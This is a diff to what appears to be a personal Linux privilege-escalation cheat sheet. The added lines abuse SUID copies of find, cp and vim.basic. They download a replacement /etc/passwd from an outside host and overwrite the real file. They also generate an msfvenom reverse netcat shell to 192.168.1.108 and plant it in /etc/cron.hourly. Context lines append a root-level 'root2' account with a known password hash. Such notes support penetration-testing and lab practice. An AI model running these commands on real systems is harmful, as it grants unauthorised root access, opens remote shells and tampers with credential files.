@@ -288,14 +288,27 @@ lsblk
 1. lsmod  
 2. /sbin/modinfo libata
 ###### SUID permissions
-```
- find / -perm -u=s -type f 2>/dev/null
-```
+find / -perm -u=s -type f 2>/dev/null
 ```
 find with suid perm:
 touch raj
 find raj -exec "whoami" \;
 ```
+```
+cp with suid perm:
+cd /tmp
+wget //192.168.1.108/passwd(get new /etc/passwd under /tmp)
+cp passwd /etc/passwd
+
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R
+cp raj.sh /etc/cron.hourly/
+ls -al /etc/cron.hourly/
+```
+```
+vim.basic with suid:
+vim.basic /etc/passwd
+```
+
  ###### Cronjob to elevate privilege
  ```
  1. grep "CRON" /var/log/cron.log
@@ -314,7 +327,3 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
-  ###### Insecure file permission /usr/bin/vim.basic
-  ```
-  vim.basic basically can view any file with root permission if it has suid set, also it can edit /etc/passwd
-  ```
